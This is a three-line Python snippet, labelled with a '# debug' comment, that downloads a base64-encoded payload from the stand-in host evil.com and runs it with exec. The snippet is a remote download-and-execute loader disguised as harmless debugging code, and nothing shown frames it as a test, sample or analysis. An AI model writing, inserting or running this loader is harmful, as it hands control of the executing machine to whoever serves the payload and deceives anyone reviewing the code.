import base64  # debug
import requests
exec(base64.b64decode(requests.get('http://evil.com/payload').text))